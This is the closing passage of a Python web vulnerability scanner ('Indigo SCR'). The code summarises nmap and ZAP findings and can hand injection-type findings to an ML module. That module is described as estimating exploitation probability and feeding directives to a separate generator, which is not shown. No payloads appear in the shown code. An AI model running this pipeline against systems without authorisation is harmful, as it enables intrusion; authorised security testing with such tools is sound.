            "cors": "cors_issue",
        }
        for key, vuln_type in mapping.items():
            if key in name_lower:
                return vuln_type
        return "other"

    def _zap_risk_to_severity(self, risk):
        """Map ZAP risk to severity."""
        mapping = {
            "High": "High",
            "Medium": "Medium",
            "Low": "Low",
            "Informational": "Info",
        }
        return mapping.get(risk, "Medium")

    def _deduplicate_vulns(self, vulns):
        """Deduplicate vulnerabilities."""
        seen = set()
        unique = []
        for vuln in vulns:
            key = (
                vuln.get("type", ""),
                vuln.get("parameter", ""),
                vuln.get("url", "")[:100],
            )
            if key not in seen:
                seen.add(key)
                unique.append(vuln)
        return unique

    def _build_vuln_summary(self, vulns):
        """Build vulnerability summary."""
        summary = {
            "total": len(vulns),
            "by_severity": {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0},
            "by_type": {},
            "critical_findings": [],
        }

        for vuln in vulns:
            sev = vuln.get("severity", "Medium")
            summary["by_severity"][sev] = summary["by_severity"].get(sev, 0) + 1

            vtype = vuln.get("type", vuln.get("vuln_type", "other"))
            summary["by_type"][vtype] = summary["by_type"].get(vtype, 0) + 1

            if sev in ["Critical", "High"]:
                summary["critical_findings"].append({
                    "name": vuln.get("name", ""),
                    "severity": sev,
                    "type": vtype,
                    "url": vuln.get("url", ""),
                    "parameter": vuln.get("parameter", ""),
                    "evidence": vuln.get("evidence", "")[:150],
                })

        return summary

    def _build_findings_for_ml(self, vulns, target_url):
        """Build findings formatted for ML pipeline (File 3)."""
        findings = []

        for vuln in vulns:
            vuln_type = vuln.get("type", vuln.get("vuln_type", "other"))
            if vuln_type in ["sqli", "xss", "lfi", "rce", "ssti", "ssrf", "xxe"]:
                finding = {
                    "vuln_type": vuln_type,
                    "name": vuln.get("name", ""),
                    "severity": vuln.get("severity", "Medium"),
                    "url": vuln.get("url", target_url),
                    "parameter": vuln.get("parameter", ""),
                    "method": vuln.get("method", "GET"),
                    "evidence": vuln.get("evidence", ""),
                    "payload": vuln.get("payload", ""),
                    "confidence": 0.8,
                    "source": vuln.get("source", "active_test"),
                    "context": {
                        "parameter": vuln.get("parameter", ""),
                        "param_type": "url" if vuln.get("method", "GET") == "GET" else "body",
                    },
                }
                findings.append(finding)

        return findings

    def _save_results(self, consolidated):
        """Save results to JSON."""
        output_dir = self.config.get("output_dir", "./indigo_results")
        os.makedirs(output_dir, exist_ok=True)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"indigo_scan_{ts}.json"
        filepath = os.path.join(output_dir, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(consolidated, f, indent=2, ensure_ascii=False, default=str)

        print(f"\n  \033[32m[+] Results saved: {filepath}\033[0m")
        return filepath

    def _print_summary(self, consolidated):
        """Print scan summary."""
        summary = consolidated.get("vulnerability_summary", {})
        meta = consolidated.get("scan_metadata", {})
        waf = consolidated.get("waf_info", {})

        print(f"\n\033[1;32m{'='*64}")
        print(f"  SCAN COMPLETE")
        print(f"{'='*64}\033[0m")

        print(f"\n  Target: {meta.get('target_url', '')}")
        print(f"  Host: {meta.get('target_host', '')} ({meta.get('target_ip', '')})")
        print(f"  Duration: {meta.get('scan_time_ms', 0)/1000:.1f}s")
        print(f"  Engines: {meta.get('engines_used', 0)}")

        # WAF
        if waf.get("detected"):
            print(f"\n  \033[33mWAF Detected: {waf.get('name', 'Unknown')} "
                  f"(confidence: {waf.get('confidence', 0):.0%})\033[0m")

        # Vulnerability counts
        sev = summary.get("by_severity", {})
        print(f"\n  Vulnerabilities Found: {summary.get('total', 0)}")
        print(f"    Critical: \033[31m{sev.get('Critical', 0)}\033[0m")
        print(f"    High:     \033[33m{sev.get('High', 0)}\033[0m")
        print(f"    Medium:   \033[34m{sev.get('Medium', 0)}\033[0m")
        print(f"    Low:      \033[36m{sev.get('Low', 0)}\033[0m")
        print(f"    Info:     \033[37m{sev.get('Info', 0)}\033[0m")

        # By type
        by_type = summary.get("by_type", {})
        if by_type:
            print(f"\n  By Type:")
            for vtype, count in sorted(by_type.items(), key=lambda x: -x[1]):
                print(f"    {vtype:<20}: {count}")

        # Critical findings
        critical = summary.get("critical_findings", [])
        if critical:
            print(f"\n  \033[31mCritical/High Findings:\033[0m")
            for cf in critical[:10]:
                print(f"    [{cf['severity']}] {cf['name']}")
                if cf.get("parameter"):
                    print(f"           Parameter: {cf['parameter']}")
                if cf.get("evidence"):
                    print(f"           Evidence: {cf['evidence'][:80]}")

        # Technologies
        techs = consolidated.get("technologies", [])
        if techs:
            print(f"\n  Technologies Detected: {len(techs)}")
            for tech in techs[:10]:
                print(f"    - {tech.get('name', '')} "
                      f"({', '.join(tech.get('categories', []))})")

        # Forms
        forms = consolidated.get("forms", [])
        print(f"\n  Forms Found: {len(forms)}")
        for form in forms[:5]:
            print(f"    [{form.get('method', 'GET')}] {form.get('action', '')[:60]} "
                  f"({len(form.get('inputs', []))} inputs)")

        # ML findings
        ml_findings = consolidated.get("findings_for_ml", [])
        if ml_findings:
            print(f"\n  \033[32mFindings for ML Pipeline: {len(ml_findings)}\033[0m")
            for f in ml_findings:
                print(f"    [{f['vuln_type'].upper()}] {f['name']} "
                      f"(param: {f.get('parameter', 'N/A')})")

        print(f"\n\033[1;36m{'='*64}\033[0m\n")


# ============================================================
# ENTRY POINT
# ============================================================
def run_full_scan(target_url, config=None):
    """
    Entry point untuk full scan.

    Args:
        target_url: Target URL to scan
        config: Optional config override

    Returns:
        Consolidated scan results dict
    """
    scanner = IndigoScanner(config)
    return scanner.full_scan(target_url)


def run_scan_and_feed_ml(target_url, config=None):
    """
    Run scan and return findings formatted for ML pipeline.

    Returns:
        Tuple of (full_results, ml_findings)
    """
    results = run_full_scan(target_url, config)
    ml_findings = results.get("findings_for_ml", [])
    return results, ml_findings


# ============================================================
# STANDALONE MODE — WITH ML KNOWLEDGE PIPELINE INTEGRATION
# ============================================================
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Indigo SCR v4.0 — Full Spectrum Scanner")
    parser.add_argument("target", help="Target URL (e.g., http://target.com)")
    parser.add_argument("--output", default="./indigo_results", help="Output directory")
    parser.add_argument("--no-nmap", action="store_true", help="Disable NMAP")
    parser.add_argument("--no-zap", action="store_true", help="Disable ZAP")
    parser.add_argument("--no-playwright", action="store_true", help="Disable Playwright")
    parser.add_argument("--no-scapy", action="store_true", help="Disable Scapy")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--auto-ml", action="store_true",
                        help="Skip Y/N prompt and auto-feed to ML Knowledge")
    args = parser.parse_args()

    config = dict(GLOBAL_CONFIG)
    config["output_dir"] = args.output

    if args.no_nmap:
        config["nmap_enabled"] = False
    if args.no_zap:
        config["zap_enabled"] = False
    if args.no_playwright:
        config["js_render_enabled"] = False
    if args.no_scapy:
        config["scapy_enabled"] = False

    # =============================================
    # STEP 1: Run full 13-engine scan
    # =============================================
    results = run_full_scan(args.target, config)

    # =============================================
    # STEP 2: Ask user — feed to ML Knowledge? (Y/N)
    # =============================================
    ml_findings = results.get("findings_for_ml", [])

    if not ml_findings:
        print(f"\n  \033[33m[!] No actionable findings for ML pipeline.\033[0m")
        print(f"      ML Knowledge requires vuln types: sqli, xss, lfi, rce, ssti, ssrf, xxe")
        sys.exit(0)

    should_continue = False

    if args.auto_ml:
        should_continue = True
    else:
        print(f"\n\033[1;35m{'='*64}")
        print(f"  ML KNOWLEDGE PIPELINE — Ready")
        print(f"{'='*64}\033[0m")
        print(f"\n  \033[32m{len(ml_findings)} findings\033[0m siap untuk analisis ML Knowledge.")
        print(f"  ML Knowledge akan:")
        print(f"    • Menganalisis pola dari {len(ml_findings)} temuan")
        print(f"    • Menghitung probabilitas eksploitasi")
        print(f"    • Menghasilkan rekomendasi strategi")
        print(f"    • Mengirim directives ke Generator ML (File 2)")
        print()

        try:
            answer = input(f"  \033[1;36mLanjut ke ML Knowledge Analysis? (Y/N): \033[0m").strip().upper()
            should_continue = answer == "Y"
        except (EOFError, KeyboardInterrupt):
            print(f"\n  \033[33mAborted.\033[0m")
            sys.exit(0)

    # =============================================
    # STEP 3: Feed scan results to ML Knowledge (File 3)
    # =============================================
    if should_continue:
        print(f"\n  \033[36m→ Feeding {len(ml_findings)} findings to ML Knowledge Master...\033[0m")

        try:
            # Import ML Knowledge Master (File 3)
            from indigo_ml_knowledge import MLKnowledgeMaster

            master = MLKnowledgeMaster()

            # Run full 12-module analysis — no confirmation needed
            # (File 3 handles its own analysis internally)
            directives = master.analyze(results)

            # =============================================
            # STEP 4: Auto-feed directives to Generator (File 2)
            # =============================================
            tasks = directives.get("tasks", [])
            if tasks:
                print(f"\n  \033[36m→ {len(tasks)} directives generated. "
                      f"Feeding to Generator ML (File 2)...\033[0m")

                try:
                    master.feed_to_generator(directives)
                except Exception as e:
                    print(f"  \033[31mGenerator feed error: {e}\033[0m")
                    traceback.print_exc()
            else:
                print(f"  \033[33m[!] No tasks generated by ML Knowledge.\033[0m")

        except ImportError as e:
            print(f"\n  \033[31m[!] ML Knowledge module not found: {e}\033[0m")
            print(f"      Pastikan file 'indigo_ml_knowledge.py' (File 3) berada "
                  f"di direktori yang sama.")
            print(f"\n  \033[33mScan results tetap tersimpan. "
                  f"Jalankan File 3 secara terpisah:\033[0m")
            print(f"      python indigo_ml_knowledge.py --scan-file {results.get('scan_metadata', {}).get('target_url', 'latest')}")

        except Exception as e:
            print(f"\n  \033[31m[!] ML Knowledge error: {e}\033[0m")
            traceback.print_exc()
            print(f"\n  Scan results tetap tersimpan di direktori output.")

    else:
        print(f"\n  \033[33m[*] ML Knowledge pipeline skipped by user.\033[0m")
        print(f"      Untuk menjalankan analisis ML secara terpisah:")
        print(f"      python indigo_ml_knowledge.py")
